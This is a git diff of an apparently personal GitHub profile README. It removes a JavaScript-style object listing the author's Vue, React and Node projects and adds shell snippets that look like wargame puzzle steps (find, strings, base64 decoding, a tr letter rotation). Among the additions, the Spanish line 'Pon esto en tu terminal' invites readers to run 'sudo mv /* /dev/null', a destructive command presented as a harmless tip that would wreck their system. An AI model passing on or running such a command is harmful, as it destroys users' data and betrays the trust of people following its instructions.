@@ -1,40 +1,13 @@
-    const myProfile = {
-      Distros: ['elementary OS', 'ArchLinux' ],
-      VueJs: { 
-        Habilities: [Vue2, Vue3, Quasar, Vuex, reactive, Vue-router, Firebase],
-        Deploy: [Android, Smart-TV, Spa, Ssr, Electron],
-        Experience: {
-          Estadio TNT Sports (Web): https://cl.estadio.com
-          Estadio TNT Sports (LG): https://www.linkedin.com/feed/update/urn:li:activity:6839580386524233728
-          CFGym (Web mobile): https://nacholabraweb.000webhostapp.com/pwa/EjApp/
-          naxChat Web móvil V1: https://github.com/naxo25/App-Chat-Quasar-VueJs-Firebase
-          naxChat Web móvil V2: https://github.com/naxo25/App-Chat-Quasar-VueJs-Firebase-V2
-          naxChat Android: https://github.com/naxo25/App-Chat-Quasar-VueJs-Firebase/blob/main/dist/Android/naxChat_Capacitor.apk
-        }
-      },
-      ReactJs: {
-        https://codesandbox.io/s/jolly-dew-c3ymz
-      },
-      NodeJs: {
-        https://github.com/naxo25/nodejs-mysql-vue
-      },
-      Js: { 
-        https://github.com/naxo25/Responsive-Tables-Api-Pokemons-Css-Js
-        https://github.com/naxo25/App_Toma-Turnos
-      },
-      U: {
-        python: https://github.com/naxo25/Trabajo-de-Titulo-UTFSM,
-        jQuery-Php: https://github.com/naxo25/Practica
-        Utfsm: https://github.com/naxo25/UTFSM
-      },
-      others: {
-        youTube: https://www.youtube.com/channel/UClJr019QbaWJy3klKDOenXQ
-        github: https://github.com/naxo25
-        site: https://nacholabraweb.000webhostapp.com
-        Tutoriales: https://nacholabraweb.000webhostapp.com/Tutoriales/#/Linux
-        otherCodes: https://github.com/naxo25/misc
-      }
-    };
+	ssh user@server -p 8080
+	find / -user naxweb -group nax size 33c | grep 'palabra' > data.txt
+	cont=1; strings data.txt | grep '===' | while read line; do echo "Línea $cont"; let cont+= 1; done
+	cat data.txt | base64 -d | tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]'
+    
+Pon esto en tu terminal
+
+    sudo mv /* /dev/null
+
+## NodeJs
 
     const express = require('express'),
     const app = express();
